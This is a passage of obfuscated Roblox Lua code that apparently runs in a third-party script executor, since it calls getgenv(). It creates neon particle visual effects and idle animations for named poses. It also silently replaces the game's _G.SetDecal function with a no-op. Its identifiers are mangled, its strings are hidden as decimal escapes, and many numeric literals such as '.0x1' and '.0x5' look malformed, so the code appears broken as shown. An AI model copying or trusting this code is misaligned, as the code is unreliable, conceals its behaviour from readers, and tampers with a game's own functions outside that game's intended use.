_lIllIlIIII.Size=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x5),NumberSequenceKeypoint.new(0x1,0x0)}) _lIllIlIIII.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x1),NumberSequenceKeypoint.new(.0x1,.0x9),NumberSequenceKeypoint.new(0x1,0x1)}) _lIllIlIIII.Color=ColorSequence.new{ColorSequenceKeypoint.new(0x0,Color3.fromRGB(0xFF,0xFF,0xFF)),ColorSequenceKeypoint.new(0x1,Color3.fromRGB(0x0,0xFF,0xFF))} _lIllIlIIII.Speed=NumberRange.new(0x1); _lIllIlIIII.Acceleration=Vector3.new(0x0,0x0,.0x1); _lIllIlIIII.VelocitySpread=0x0 _lIllIlIIII.ZOffset=0x0; _lIllIlIIII.Rotation=NumberRange.new(0x0); _lIllIlIIII:Emit(0x1); _lIllIlIIII.LockedToPart=true task.delay(.0x1, function () _lIllIlIIII.Rate=0x0 end
 ) _lIIlIIIlIl.CFrame=_IIllIIlllI.Torso.CFrame*CFrame.new(math.random(-0x19,0x19),-0x5,math.random(-0x19,0x19)) _lllIlIIlIl:Create(_lIIlIIIlIl,TweenInfo.new(1.5),{Size=Vector3.new(0x0,0x0,0x0),CFrame=_lIIlIIIlIl.CFrame*CFrame.new(math.random(-0x5,0x5),0xF+math.random(0x2,0x8),math.random(-0x5,0x5))}):Play() task.wait(.0x5) end
 elseif idleName == "\091\083\071\093\032\069\117\099\108\105\100\101\097\110" then local _IIllIllIll = 0x0 while _IIllIIIIll() do _IIllIllIll = _IIllIllIll + 0x1 local _IIllIIlllI, _IIlIllIlII = _IIIllIllIl() if not _IIllIIlllI or not _IIlIllIlII then task.wait(.0x1) continue end
 local _lllIlIIllI = _IIllIIlllI:FindFirstChild("\076\101\102\116\032\065\114\109") if not _lllIlIIllI then task.wait(.0x1) continue end
 local _llIlIIIlll = math.random(0x0,0x1) local _IIlIllIIlI = _llIlIIIlll==0x1 and Color3.new(0x1,0x0,0x0) or Color3.new(0x0,0x0,0x1) local _lIIIIIIlIl=Instance.new("\080\097\114\116"); _lIIIIIIlIl.Parent=_IIllIlIlIl(); _lIIIIIIlIl.Material=Enum.Material.Neon _lIIIIIIlIl.Anchored=true; _lIIIIIIlIl.CanCollide=false; _lIIIIIIlIl.Color=_IIlIllIIlI local _lllIIIlIII=Instance.new("\083\112\101\099\105\097\108\077\101\115\104",_lIIIIIIlIl); _lllIIIlIII.MeshType="\083\112\104\101\114\101"; _lllIIIlIII.Scale=Vector3.new(.0x5,.0x5,.0x5) _lIIIIIIlIl.CFrame=_lllIlIIllI.CFrame*CFrame.new(0x0,-0x1,0x0)*CFrame.Angles(math.random(-0x168,0x168),math.random(-0x168,0x168),math.random(-0x168,0x168)) _llIlIIlIll:AddItem(_lIIIIIIlIl,0x2) _lllIlIIlIl:Create(_lIIIIIIlIl,TweenInfo.new(0x1),{CFrame=_lIIIIIIlIl.CFrame*CFrame.new(0x0,0x3,0x0)}):Play() _lllIlIIlIl:Create(_lllIIIlIII,TweenInfo.new(.0x5),{Scale=Vector3.new(0x0,0x2,0x0)}):Play() local _IlIIIIIIlI=Instance.new("\080\097\114\116"); _IlIIIIIIlI.Parent=_IIllIlIlIl(); _IlIIIIIIlI.Material=Enum.Material.Neon _IlIIIIIIlI.Anchored=true; _IlIIIIIIlI.CanCollide=false; _IlIIIIIIlI.Size=Vector3.new(.0x3,.0x3,.0x3); _IlIIIIIIlI.Color=_IIlIllIIlI _llIlIIlIll:AddItem(_IlIIIIIIlI,.0x8) if math.random(0x0,0x1)==0x0 then _IlIIIIIIlI.CFrame=_IIlIllIlII.CFrame*CFrame.new(math.random(-0xF,0xF),-0x3,math.random(-0xF,0xF))*CFrame.Angles(math.rad(math.random(-0xF,0xF)),math.rad(math.random(-0xF,0xF)),math.rad(math.random(-0xF,0xF))) _lllIlIIlIl:Create(_IlIIIIIIlI,TweenInfo.new(.0x8),{Size=Vector3.new(0x0,0x2+math.random(0x2,0x4),0x0),CFrame=_IlIIIIIIlI.CFrame*CFrame.new(0x0,0x2,0x0)}):Play() local _lIllIlIIII=Instance.new("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114",_IlIIIIIIlI) _lIllIlIIII.LightEmission=0x1; _lIllIlIIII.Brightness=0x1; _lIllIlIIII.Orientation="\070\097\099\105\110\103\067\097\109\101\114\097\087\111\114\108\100\085\112"; _lIllIlIIII.Texture="\114\098\120\097\115\115\101\116\105\100\058\047\047\054\054\055\051\048\050\049\057\056\052" _lIllIlIIII.Rate=0xFF; _lIllIlIIII.Lifetime=NumberRange.new(.0x6) _lIllIlIIII.Size=NumberSequence.new({NumberSequenceKeypoint.new(0x0,math.random(0x1,0x5)),NumberSequenceKeypoint.new(0x1,0x0)}) _lIllIlIIII.Squash=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x1),NumberSequenceKeypoint.new(.0x5,-0x1),NumberSequenceKeypoint.new(.0x5,0x0),NumberSequenceKeypoint.new(0x1,0x0)}) _lIllIlIIII.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x1),NumberSequenceKeypoint.new(.0x1,.0x8),NumberSequenceKeypoint.new(0x1,0x1)}) if _llIlIIIlll==0x1 then _lIllIlIIII.Color=ColorSequence.new{ColorSequenceKeypoint.new(0x0,Color3.fromRGB(0xFF,0x0,0x0)),ColorSequenceKeypoint.new(0x1,Color3.fromRGB(0x7F,0x0,0x0))} else _lIllIlIIII.Color=ColorSequence.new{ColorSequenceKeypoint.new(0x0,Color3.fromRGB(0x0,0x0,0xFF)),ColorSequenceKeypoint.new(0x1,Color3.fromRGB(0xFC,0xFF,0xFF))} end
 _lIllIlIIII.Speed=NumberRange.new(0x0); _lIllIlIIII.VelocitySpread=0xC350; _lIllIlIIII.ZOffset=0x2; _lIllIlIIII.Rotation=NumberRange.new(0x5A) _lIllIlIIII:Emit(0x1); _lIllIlIIII.LockedToPart=true; task.delay(.0x3, function () _lIllIlIIII.Rate=0x0 end
 ) else _IlIIIIIIlI.CFrame=_IIlIllIlII.CFrame*CFrame.new(math.random(-0xF,0xF),math.random(-0x3,0xF),math.random(-0xF,0xF))*CFrame.Angles(_IIllIllIll,_IIllIllIll,-_IIllIllIll) _lllIlIIlIl:Create(_IlIIIIIIlI,TweenInfo.new(.0x8),{Size=Vector3.new(0x0,0x0,0x0),CFrame=_IlIIIIIIlI.CFrame*CFrame.new(0x0,0x2,0x0)}):Play() local _lIllIlIIII=Instance.new("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114",_IlIIIIIIlI) _lIllIlIIII.LightEmission=0x1; _lIllIlIIII.Brightness=0x1; _lIllIlIIII.Orientation="\070\097\099\105\110\103\067\097\109\101\114\097\087\111\114\108\100\085\112"; _lIllIlIIII.Texture="\114\098\120\097\115\115\101\116\105\100\058\047\047\054\054\055\051\048\050\049\057\056\052" _lIllIlIIII.Rate=0x4D; _lIllIlIIII.Lifetime=NumberRange.new(.0x3) _lIllIlIIII.Size=NumberSequence.new({NumberSequenceKeypoint.new(0x0,math.random(0x1,0x5)),NumberSequenceKeypoint.new(0x1,0x0)}) _lIllIlIIII.Squash=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x2),NumberSequenceKeypoint.new(.0x1,-0x2),NumberSequenceKeypoint.new(.0x2,0x2),NumberSequenceKeypoint.new(.0x3,-0x2),NumberSequenceKeypoint.new(.0x4,0x2),NumberSequenceKeypoint.new(.0x5,-0x2),NumberSequenceKeypoint.new(.0x5,0x0),NumberSequenceKeypoint.new(0x1,0x0)}) _lIllIlIIII.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x1),NumberSequenceKeypoint.new(.0x1,.0x8),NumberSequenceKeypoint.new(0x1,0x1)}) if _llIlIIIlll==0x1 then _lIllIlIIII.Color=ColorSequence.new{ColorSequenceKeypoint.new(0x0,Color3.fromRGB(0xFF,0x0,0x0)),ColorSequenceKeypoint.new(0x1,Color3.fromRGB(0xFC,0xFF,0xFF))} else _lIllIlIIII.Color=ColorSequence.new{ColorSequenceKeypoint.new(0x0,Color3.fromRGB(0x0,0x0,0xFF)),ColorSequenceKeypoint.new(0x1,Color3.fromRGB(0xFC,0xFF,0xFF))} end
 _lIllIlIIII.Speed=NumberRange.new(0x0); _lIllIlIIII.VelocitySpread=0xC350; _lIllIlIIII.ZOffset=0x0; _lIllIlIIII.Rotation=NumberRange.new(0x5A) _lIllIlIIII:Emit(0x1); _lIllIlIIII.LockedToPart=true; task.delay(.0x3, function () _lIllIlIIII.Rate=0x0 end
 ) end
 task.wait(.0x1) end
 elseif idleName == "\091\083\071\093\032\069\113\117\105\110\111\120" then while _IIllIIIIll() do local _IIllIIlllI, _IIlIllIlII = _IIIllIllIl() if not _IIllIIlllI or not _IIlIllIlII then task.wait(.0x1) continue end
 local _lIIIlIlIIl=math.random(0x0,0x1) local _lIIlIIIlIl=Instance.new("\080\097\114\116"); _llIlIIlIll:AddItem(_lIIlIIIlIl,.0x7) _lIIlIIIlIl.Material=Enum.Material.Neon; _lIIlIIIlIl.Size=Vector3.new(0x1,0x1,0x1) _lIIlIIIlIl.Anchored=true; _lIIlIIIlIl.CanCollide=false; _lIIlIIIlIl.Color=Color3.new(_lIIIlIlIIl,_lIIIlIlIIl,_lIIIlIlIIl) _lIIlIIIlIl.Parent=_IIllIlIlIl() local _lllIIIlIII=Instance.new("\083\112\101\099\105\097\108\077\101\115\104",_lIIlIIIlIl); _lllIIIlIII.MeshType="\083\112\104\101\114\101" _lIIlIIIlIl.CFrame=CFrame.new(_IIlIllIlII.CFrame.X+math.random(-0x19,0x19),_IIlIllIlII.CFrame.Y-0x3,_IIlIllIlII.CFrame.Z+math.random(-0x19,0x19)) local _lIllIlIIII=Instance.new("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114",_lIIlIIIlIl) _lIllIlIIII.LightEmission=0x9B; _lIllIlIIII.Brightness=0x1; _lIllIlIIII.Texture="\114\098\120\097\115\115\101\116\105\100\058\047\047\054\054\055\051\048\050\049\057\056\052" _lIllIlIIII.Rate=0x9B; _lIllIlIIII.Lifetime=NumberRange.new(.0x5) _lIllIlIIII.Size=NumberSequence.new({NumberSequenceKeypoint.new(0x0,math.random(0x1,0x5)*0x5),NumberSequenceKeypoint.new(0x1,0x0)}) _lIllIlIIII.Orientation="\086\101\108\111\099\105\116\121\080\097\114\097\108\108\101\108" _lIllIlIIII.Squash=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x0),NumberSequenceKeypoint.new(.0x3,-0x7),NumberSequenceKeypoint.new(0x1,0x0)}) _lIllIlIIII.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x1),NumberSequenceKeypoint.new(.0x1,.0x9),NumberSequenceKeypoint.new(0x1,0x1)}) _lIllIlIIII.Color=ColorSequence.new{ColorSequenceKeypoint.new(0x0,Color3.fromRGB(0xFF,0xFF,0xFF)),ColorSequenceKeypoint.new(0x1,Color3.fromRGB(0x0,0x0,0x0))} _lIllIlIIII.Speed=NumberRange.new(0x1); _lIllIlIIII.Acceleration=Vector3.new(0x0,0x0,.0x1); _lIllIlIIII.VelocitySpread=0x0 _lIllIlIIII.ZOffset=-0x2; _lIllIlIIII.Rotation=NumberRange.new(0x0); _lIllIlIIII:Emit(0x1) task.delay(.0x1, function () _lIllIlIIII.Rate=0x0 end
 ) _lllIIIlIII.Scale=Vector3.new(0x3,0x3,0x3) _lllIlIIlIl:Create(_lllIIIlIII,TweenInfo.new(0x1),{Scale=Vector3.new(0x0,0x2D,0x0)}):Play() _lllIlIIlIl:Create(_lIIlIIIlIl,TweenInfo.new(1.6),{Transparency=0x1}):Play() task.wait(.0x1) end
 elseif idleName == "\091\083\071\093\032\067\114\097\122\101\100" then while _IIllIIIIll() do local _IIllIIlllI, _IIlIllIlII = _IIIllIllIl() if not _IIllIIlllI or not _IIlIllIlII then task.wait(.0x5) continue end
 spawn( function () local _lIIlIIIlIl=Instance.new("\080\097\114\116"); _llIlIIlIll:AddItem(_lIIlIIIlIl,1.5) _lIIlIIIlIl.Material=Enum.Material.Neon; _lIIlIIIlIl.Anchored=true; _lIIlIIIlIl.CanCollide=false _lIIlIIIlIl.Color=Color3.new(0x0,0x0,0x1); _lIIlIIIlIl.Parent=_IIllIlIlIl() local _lllIIIlIII=Instance.new("\083\112\101\099\105\097\108\077\101\115\104",_lIIlIIIlIl); _lllIIIlIII.MeshType="\083\112\104\101\114\101" local _lIllIlIIII=Instance.new("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114",_lIIlIIIlIl) _lIllIlIIII.LightEmission=0xF; _lIllIlIIII.Brightness=0x1; _lIllIlIIII.Texture="\114\098\120\097\115\115\101\116\105\100\058\047\047\054\054\055\051\048\050\049\057\056\052" _lIllIlIIII.Rate=0x9B; _lIllIlIIII.Lifetime=NumberRange.new(3.5) _lIllIlIIII.Size=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x5),NumberSequenceKeypoint.new(0x1,0xF)}) _lIllIlIIII.Squash=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x5),NumberSequenceKeypoint.new(0x1,0xF)}) _lIllIlIIII.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x1),NumberSequenceKeypoint.new(.0x1,.0x9),NumberSequenceKeypoint.new(0x1,0x1)}) _lIllIlIIII.Color=ColorSequence.new{ColorSequenceKeypoint.new(0x0,Color3.fromRGB(0x0,0x0,0xFF)),ColorSequenceKeypoint.new(0x1,Color3.fromRGB(0x0,0x0,0xFF))} _lIllIlIIII.Speed=NumberRange.new(0x0); _lIllIlIIII.Acceleration=Vector3.new(0x0,0x5,0x0); _lIllIlIIII.VelocitySpread=0x0 _lIllIlIIII.ZOffset=0x0; _lIllIlIIII.Orientation="\086\101\108\111\099\105\116\121\080\097\114\097\108\108\101\108"; _lIllIlIIII.Rotation=NumberRange.new(0x5A) _lIllIlIIII:Emit(0x1); _lIllIlIIII.LockedToPart=true; task.delay(.0x1, function () _lIllIlIIII.Rate=0x0 end
 ) spawn( function () for j=0x1,0x2D do _lIIlIIIlIl.Color=Color3.fromRGB(0x0,0x0,math.random(0x1,0x9B)) task.wait(.0x2) end
 end
 ) _lIIlIIIlIl.Size=Vector3.new(0x1,.0x1,0x1) _lIIlIIIlIl.CFrame=_IIlIllIlII.CFrame*CFrame.new(math.random(-0x4D,0x4D),-0x2,math.random(-0x4D,0x4D))*CFrame.Angles(math.rad(math.random(-0xF,0xF)),0x0,0x0) _lllIlIIlIl:Create(_lIIlIIIlIl,TweenInfo.new(.0x5),{Size=Vector3.new(0x2,.0x2,0x2)}):Play() task.wait(.0x5) _lllIlIIlIl:Create(_lIIlIIIlIl,TweenInfo.new(1.5),{CFrame=_lIIlIIIlIl.CFrame*CFrame.new(math.random(-0x5,0x5)/0x5,0xF+math.random(0x2,0x8),math.random(-0x5,0x5)/0x5),Size=Vector3.new(0x0,0x9B,0x0)}):Play() local _IIlllIIIll=Instance.new("\080\097\114\116"); _llIlIIlIll:AddItem(_IIlllIIIll,1.5) _IIlllIIIll.Material=Enum.Material.Neon; _IIlllIIIll.Anchored=true; _IIlllIIIll.CanCollide=false _IIlllIIIll.Color=Color3.new(0x0,0x0,0x1); _IIlllIIIll.Parent=_IIllIlIlIl() local _IIlllIllIl=Instance.new("\083\112\101\099\105\097\108\077\101\115\104",_IIlllIIIll); _IIlllIllIl.MeshType="\083\112\104\101\114\101" local _llIIIIlIll=Instance.new("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114",_IIlllIIIll) _llIIIIlIll.LightEmission=0xF; _llIIIIlIll.Brightness=0x1; _llIIIIlIll.Texture="\114\098\120\097\115\115\101\116\105\100\058\047\047\054\054\055\051\048\050\049\057\056\052" _llIIIIlIll.Rate=0x9B; _llIIIIlIll.Lifetime=NumberRange.new(.0x5) _llIIIIlIll.Size=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x2),NumberSequenceKeypoint.new(0x1,0x2)}) _llIIIIlIll.Squash=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x2),NumberSequenceKeypoint.new(0x1,0x2)}) _llIIIIlIll.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x1),NumberSequenceKeypoint.new(.0x1,.0x9),NumberSequenceKeypoint.new(0x1,0x1)}) _llIIIIlIll.Color=ColorSequence.new{ColorSequenceKeypoint.new(0x0,Color3.fromRGB(0x0,0x0,0xFF)),ColorSequenceKeypoint.new(0x1,Color3.fromRGB(0x0,0x0,0xFF))} _llIIIIlIll.Speed=NumberRange.new(0x0); _llIIIIlIll.Acceleration=Vector3.new(0x0,.0x3,0x0); _llIIIIlIll.VelocitySpread=0x0 _llIIIIlIll.ZOffset=0x0; _llIIIIlIll.Orientation="\086\101\108\111\099\105\116\121\080\097\114\097\108\108\101\108"; _llIIIIlIll.Rotation=NumberRange.new(0x0) _llIIIIlIll:Emit(0x1); _llIIIIlIll.LockedToPart=true; task.delay(.0x1, function () _llIIIIlIll.Rate=0x0 end
 ) spawn( function () for j=0x1,0x2D do _IIlllIIIll.Color=Color3.fromRGB(0x0,0x0,math.random(0x1,0x9B)) task.wait(.0x2) end
 end
 ) _IIlllIIIll.Size=Vector3.new(0x3,.0x5,0x3); _IIlllIIIll.CFrame=_IIllIIlllI.Torso.CFrame*CFrame.new(0x0,0x0,0x7) _lllIlIIlIl:Create(_IIlllIIIll,TweenInfo.new(.0x2),{Size=Vector3.new(0x0,0x0,0x19)}):Play() end
 ) task.wait(.0x5) end
 elseif idleName == "\091\083\071\093\032\067\111\110\116\097\109\105\110\097\110\116" then local _lIIllIlIll = 0x3E7; local _llIIIllIII = Color3.new(0x1,.0x7,0x0) while _IIllIIIIll() do _lIIllIlIll = _lIIllIlIll + .0x1 local _IIllIIlllI, _IIlIllIlII = _IIIllIllIl() if not _IIllIIlllI or not _IIlIllIlII then task.wait(.0x2) continue end
 local _IlIllIlIll=_IIllIIlllI:FindFirstChild("\082\105\103\104\116\032\065\114\109"); local _lllIlIIllI=_IIllIIlllI:FindFirstChild("\076\101\102\116\032\065\114\109") if not _IlIllIlIll or not _lllIlIIllI then task.wait(.0x2) continue end
 local function _IlIIIIIIll(arm) local _lIIlIIlllI=Instance.new("\080\097\114\116"); _lIIlIIlllI.Parent=_IIllIlIlIl(); _lIIlIIlllI.Material=Enum.Material.Neon _lIIlIIlllI.Anchored=true; _lIIlIIlllI.CanCollide=false local _lIlIIlllll=Instance.new("\083\112\101\099\105\097\108\077\101\115\104",_lIIlIIlllI); _lIlIIlllll.MeshType="\083\112\104\101\114\101" _lIIlIIlllI.Color=_llIIIllIII; _lIlIIlllll.Scale=Vector3.new(.0x5,.0x5,.0x5) _lIIlIIlllI.CFrame=arm.CFrame*CFrame.new(0x0,-0x1,0x0)*CFrame.Angles(math.random(-0x168,0x168),math.random(-0x168,0x168),math.random(-0x168,0x168)) _llIlIIlIll:AddItem(_lIIlIIlllI,0x2) _lllIlIIlIl:Create(_lIIlIIlllI,TweenInfo.new(0x1),{CFrame=_lIIlIIlllI.CFrame*CFrame.new(0x0,0x3,0x0)}):Play() _lllIlIIlIl:Create(_lIlIIlllll,TweenInfo.new(.0x5),{Scale=Vector3.new(0x0,0x2,0x0)}):Play() if _lIIllIlIll >= 0x1 then local _lIllllllII=Instance.new("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114",_lIIlIIlllI); _lIllllllII.LightEmission=0xF; _lIllllllII.LightInfluence=0x1 _lIllllllII.Size=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x2),NumberSequenceKeypoint.new(0x1,0x1)}) _lIllllllII.LockedToPart=true; _lIllllllII.Name="\095\076\115\109\111\107\101" _lIllllllII.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x1),NumberSequenceKeypoint.new(.0x5,0x0),NumberSequenceKeypoint.new(0x1,0x1)}) _lIllllllII.Lifetime=NumberRange.new(0x1) _lIllllllII.Color=ColorSequence.new{ColorSequenceKeypoint.new(0x0,Color3.fromRGB(0xFF,0xC8,0x0)),ColorSequenceKeypoint.new(0x1,Color3.fromRGB(0xFF,0xC8,0x0))} _lIllllllII.Rate=0x0; _lIllllllII.Speed=NumberRange.new(-0x3); _lIllllllII:Emit(0x1) _lIllllllII.SpreadAngle=Vector2.new(0x1E,0x1E); _lIllllllII.Rotation=NumberRange.new(0x1,0x168); _lIllllllII.RotSpeed=NumberRange.new(-0x64,0x64) _lIllllllII.Texture="\114\098\120\097\115\115\101\116\105\100\058\047\047\057\052\055\048\054\053\057\056\057\057"; _lIllllllII.Brightness=0x5; _lIllllllII.LightEmission=0xA; _lIllllllII.LightInfluence=0x0 _lIllllllII.FlipbookFramerate=NumberRange.new(0x42); _lIllllllII.FlipbookLayout="\071\114\105\100\056\120\056"; _lIllllllII.FlipbookMode="\076\111\111\112"; _lIllllllII.ZOffset=0x0 local _lIllIlIIII=Instance.new("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114",_lIIlIIlllI); _lIllIlIIII.LightEmission=0x9B; _lIllIlIIII.Texture="\114\098\120\097\115\115\101\116\105\100\058\047\047\054\054\055\051\048\050\049\057\056\052" _lIllIlIIII.Rate=0x9B; _lIllIlIIII:Emit(0x5); _lIllIlIIII.LockedToPart=true; _lIllIlIIII.Lifetime=NumberRange.new(0x1) _lIllIlIIII.Size=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x3),NumberSequenceKeypoint.new(0x1,0x0)}) _lIllIlIIII.Squash=NumberSequence.new({NumberSequenceKeypoint.new(0x0,math.random(-0xF,0xF)/0x23),NumberSequenceKeypoint.new(.0x1,math.random(-0xF,0xF)/0x23),NumberSequenceKeypoint.new(0x1,0x0)}) _lIllIlIIII.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x1),NumberSequenceKeypoint.new(.0x1,.0x8),NumberSequenceKeypoint.new(0x1,0x1)}) _lIllIlIIII.Color=ColorSequence.new{ColorSequenceKeypoint.new(0x0,_llIIIllIII),ColorSequenceKeypoint.new(0x1,_llIIIllIII)} _lIllIlIIII.Speed=NumberRange.new(0x0); _lIllIlIIII.VelocitySpread=0xC350; _lIllIlIIII.Rotation=NumberRange.new(-0x1F4,0x1F4); _lIllIlIIII.RotSpeed=NumberRange.new(-0x1F4,0x1F4); _lIllIlIIII.ZOffset=0x2 task.delay(.0x5, function () _lIllIlIIII.Rate=0x0 end
 ) end
 end
 _IlIIIIIIll(_IlIllIlIll); _IlIIIIIIll(_lllIlIIllI) if _lIIllIlIll >= 0x1 then _lIIllIlIll = 0x0 end
 task.wait(.0x2) end
 else while _IIllIIIIll() do task.wait(.0x5) end
 end
 end
 local function _lIllIIllIl() if not _llIlllIlll then return end
 _llIlllIlll = false _IIllllIIIl = _IIllllIIIl + 0x1 if getgenv()._sgOrigSetDecal ~= nil then pcall( function () if _G then _G.SetDecal = getgenv()._sgOrigSetDecal end
 end
 ) getgenv()._sgOrigSetDecal = nil end
 if _lIllIIIlll then _lIllIIIlll:Disconnect() _lIllIIIlll = nil end
 if _lIlIIlllll then _lIlIIlllll:Disconnect() _lIlIIlllll = nil end
 pcall( function () local _IllIllIIll = _llIlIIlIll.Character and _llIlIIlIll.Character:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IllIllIIll then _IllIllIIll.CameraOffset = Vector3.new() end
 end
 ) end
 local function _IlIlIlllIl(idleName) _IIllllIIIl = _IIllllIIIl + 0x1 local _IlIIlllIlI = _IIllllIIIl _lllllIllII(_llIlIIlIll.Character) task.spawn(_IlIIIIllll, idleName, _IlIIlllIlI) end
 local function _IIIIlllIll(idleName) _llIlllIlll = true if _G and type(_G.SetDecal) == "\102\117\110\099\116\105\111\110" and getgenv()._sgOrigSetDecal == nil then getgenv()._sgOrigSetDecal = _G.SetDecal _G.SetDecal = function () end
 end
 if _lIlIIlllll then _lIlIIlllll:Disconnect() end
 _lIlIIlllll = _llIlIIlIll.CharacterAdded:Connect( function (newChar) task.wait(0.1) if _llIlllIlll then _IlIlIlllIl(_llIlIllIIl) end
 end
 ) _IlIlIlllIl(idleName) end
 _IIllllllll = function () local _lIIIIIllll = _llIIllIlll.SGVFXToggle and _llIIllIlll.SGVFXToggle.Value if _lIIIIIllll and _IIIIIlIlII() then if not _llIlllIlll then _IIIIlllIll(_llIlIllIIl) else _IlIlIlllIl(_llIlIllIIl) end
 else _lIllIIllIl() end
 end
 local function _IlIlllIIll(_IlIIIllllI) local _IIllIIlllI = _llIlIIlIll.Character local _lIlIIllIII = _IIllIIlllI and _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not _lIlIIllIII then return nil end
 local _lllllIIlII = Instance.new("\065\110\105\109\097\116\105\111\110") _lllllIIlII.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _IlIIIllllI return _lIlIIllIII:LoadAnimation(_lllllIIlII) end
 local function _lIlIIlIllI(instant) _IlIllIIlIl = _IlIllIIlIl + 0x1 _IIIlllIIlI = false local _lIIlllIIII = (instant) and 0x0 or (_lIIlIllIlI.IdleAnimationEndFadeTime and _lIIlIllIlI.IdleAnimationEndFadeTime.Value or 0.2) if _IllIIIIlII then pcall( function () _IllIIIIlII:Cancel() end
 ) _IllIIIIlII = nil end
 if _lllIIIIllI then pcall( function () _lllIIIIllI:Stop(_lIIlllIIII) end
 ) _lllIIIIllI = nil end
 if _IllIIIlllI then pcall( function () _IllIIIlllI:Stop(_lIIlllIIII) end
 ) _IllIIIlllI = nil end
 if _IlIIllllll then pcall( function () _IlIIllllll:Stop(_lIIlllIIII) end
 ) _IlIIllllll = nil end
 if _llIIllIIII then pcall( function () _llIIllIIII:Stop(_lIIlllIIII) end
 ) _llIIllIIII = nil end
 if _lIIIIIIlIl then pcall( function () _lIIIIIIlIl:Stop(_lIIlllIIII) end
 ) _lIIIIIIlIl = nil end
 pcall( function () local _IllIllIIll = _llIlIIlIll.Character and _llIlIIlIll.Character:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IllIllIIll then _IllIllIIll.HipHeight = 0x0 end
 end
 ) end
 local function _IlIIIlIIlI(_IlIIIllIIl, _IllIIlIlll) _lIlIlIlIII = true if _IllIIlIlll then local _lIIlllIIII = _lIIlIllIlI.IdleAnimationEndFadeTime and _lIIlIllIlI.IdleAnimationEndFadeTime.Value or 0.2 _lIlIIlIllI(false) task.wait(_lIIlllIIII) else _lIlIIlIllI(true) end
 local _IIllIIlllI = _llIlIIlIll.Character local _lIlIIllIII = _IIllIIlllI and _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not _lIlIIllIII or _lIlIIllIII.MoveDirection ~= Vector3.new() then _lIlIIIllII = "" _llIlIllIIl = "" _lIlIlIlIII = false task.defer(_IIllllllll) return end
 local _IlIllIlIlI = _lIIlIllIlI.IdleAnimation and _lIIlIllIlI.IdleAnimation.Value or "\078\111\114\109\097\108" if _IlIllIlIlI == "\078\111\114\109\097\108" then _lIlIIIllII = "" _llIlIllIIl = "" _lIlIlIlIII = false task.defer(_IIllllllll) return end
 if _IlIllIlIlI ~= _IlIIIllIIl then _lIlIIIllII = "" _llIlIllIIl = "" _lIlIlIlIII = false task.defer(_IIllllllll) return end
 local _IIllllIlIl = _IlIIIllIIl if _IIllllIlIl == "\082\097\110\100\111\109" then local _llIIlllIII = { "\091\068\069\070\093\032\087\097\116\099\104","\091\068\069\070\093\032\067\097\115\117\097\108","\091\068\069\070\093\032\067\111\110\102\105\100\101\110\116","\091\068\069\070\093\032\070\101\110\116\032\077\097\115\116\101\114","\091\068\069\070\093\032\070\108\121\032\073\100\108\101", "\091\068\069\070\093\032\065\117\114\097","\091\068\069\070\093\032\083\101\114\105\111\117\115","\091\068\069\070\093\032\082\101\119\111\114\107","\091\068\069\070\093\032\080\114\101\112\097\114\105\110\103","\091\068\069\070\093\032\068\105\118\105\110\101","\091\068\069\070\093\032\071\111\100", "\091\083\071\093\032\077\097\121\104\101\109","\091\083\071\093\032\082\097\105\110\098\111\119","\091\083\071\093\032\090\121\108\101\100\111\110", "\091\083\071\093\032\080\101\114\115\105\115\116\101\110\099\101","\091\083\071\093\032\080\117\114\105\116\121","\091\083\071\093\032\069\117\099\108\105\100\101\097\110", "\091\083\071\093\032\069\113\117\105\110\111\120","\091\083\071\093\032\067\114\097\122\101\100","\091\083\071\093\032\084\104\101\032\066\105\103\032\066\108\097\099\107", "\091\083\071\093\032\067\111\110\116\097\109\105\110\097\110\116", } _IIllllIlIl = _llIIlllIII[math.random(0x1, #_llIIlllIII)] end
 _llIlIllIIl = _IIllllIlIl local _lIIlIlllIl = _lIIlIllIlI.IdleAnimationStartFadeTime and _lIIlIllIlI.IdleAnimationStartFadeTime.Value or 0.1 if _IIllllIlIl == "\091\068\069\070\093\032\087\097\116\099\104" then _lllIIIIllI = _IlIlllIIll("\049\056\056\057\055\055\051\051\051\049\050") if not _lllIIIIllI then _lIlIlIlIII = false task.defer(_IIllllllll) return end
 _lllIIIIllI.Priority = Enum.AnimationPriority.Idle _lllIIIIllI:Play(_lIIlIlllIl) elseif _IIllllIlIl == "\091\068\069\070\093\032\067\097\115\117\097\108" then _lllIIIIllI = _IlIlllIIll("\049\051\055\051\054\049\049\053\048\048\057") if not _lllIIIIllI then _lIlIlIlIII = false task.defer(_IIllllllll) return end
